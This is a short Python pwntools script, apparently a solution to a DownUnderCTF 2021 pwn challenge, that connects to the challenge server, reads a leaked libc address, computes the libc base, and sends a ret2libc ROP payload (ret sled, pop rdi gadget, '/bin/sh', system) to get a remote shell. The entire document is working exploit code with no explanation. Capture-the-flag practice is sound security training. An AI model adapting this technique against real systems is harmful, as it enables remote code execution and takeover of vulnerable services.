from pwn import *

libc = ELF('./libc-2.27.so')
p = remote('pwn-2021.duc.tf', 31909)

p.recv()
p.sendline(b'')

p.recv()
p.sendline(b'19')

p.recvuntil(b'is: ')

libc_leak = int(('0x' + p.recvline().strip().decode('utf-8')),16)
print(hex(libc_leak))

libc.address = libc_leak - libc.sym['puts'] - 418
print(hex(libc.address))

pop_rdi = libc.address + 0x00000000000215bf
ret = libc.address + 0x00000000000008aa
system = libc.sym['system']
bin_sh = next(libc.search(b'/bin/sh\x00'))

p.recv()
p.sendline(b'256')

payload = p64(ret)*21
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)
payload = payload.ljust(256, b'\x00')

p.sendline(payload)

p.interactive()